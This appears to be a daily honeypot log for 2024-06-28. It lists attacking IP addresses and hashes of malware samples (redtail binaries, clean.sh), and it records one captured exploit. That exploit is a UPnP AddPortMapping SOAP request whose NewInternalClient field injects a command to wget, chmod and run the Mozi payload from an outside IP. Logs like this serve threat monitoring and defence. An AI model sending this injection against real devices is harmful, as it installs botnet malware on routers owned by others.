2024/06/28-06-2024

Top 5 IPs for 2024-06-28 :

202.133.187.165
36.91.21.49
103.153.254.142
171.244.42.244
43.128.104.71

Malware Observed:


File name : clean.sh
d46555af1173d22f07c37ef9c1e0e74fd68db022f2b6fb3ab5388d2c5bc6a98e
https://www.virustotal.com/gui/file/d46555af1173d22f07c37ef9c1e0e74fd68db022f2b6fb3ab5388d2c5bc6a98e

File name : redtail.arm7
1897b34d2e24e1a37d961add5243ac247f709b3ab4b0967eb2e2cbc1aa86dc16
https://www.virustotal.com/gui/file/1897b34d2e24e1a37d961add5243ac247f709b3ab4b0967eb2e2cbc1aa86dc16

File name : redtail.arm8
d92990b37ba580266b4a724f1eae9c8f00c0872f8aa981ce9b64dc8df8a0744b
https://www.virustotal.com/gui/file/d92990b37ba580266b4a724f1eae9c8f00c0872f8aa981ce9b64dc8df8a0744b

File name : redtail.i686
f04e075e655a31cd4cb416583327b6fb4db2a0de66c4d873ae3c6acf95dc4e0f
https://www.virustotal.com/gui/file/f04e075e655a31cd4cb416583327b6fb4db2a0de66c4d873ae3c6acf95dc4e0f

File name : redtail.x86_64
7db527e1b4a95c2d8cd94201cb19bf819d2c52d3bab9e558124e0d32a7f38200
https://www.virustotal.com/gui/file/7db527e1b4a95c2d8cd94201cb19bf819d2c52d3bab9e558124e0d32a7f38200


Commands/exploits observed:

POST /picsdesc.xml HTTP/1.1
Content-Length: 630
Accept-Encoding: gzip, deflate
SOAPAction: urn:schemas-upnp-org:service:WANIPConnection:1#AddPortMapping
Accept: /
User-Agent: Hello-World
Connection: keep-alive

<?xml version="1.0" ?><s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope//" s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"><s:Body><u:AddPortMapping xmlns:u="urn:schemas-upnp-org:service:WANIPConnection:1"><NewRemoteHost></NewRemoteHost><NewExternalPort>47450</NewExternalPort><NewProtocol>TCP</NewProtocol><NewInternalPort>44382</NewInternalPort><NewInternalClient>cd /var/; wget http://42.224.195.133:37782/Mozi.m; chmod +x Mozi.m; ./Mozi.m</NewInternalClient><NewEnabled>1</NewEnabled><NewPortMappingDescription>syncthing</NewPortMappingDescription><NewLeaseDuration>0</NewLeaseDuration></u:AddPortMapping></s:Body></s:Envelope>
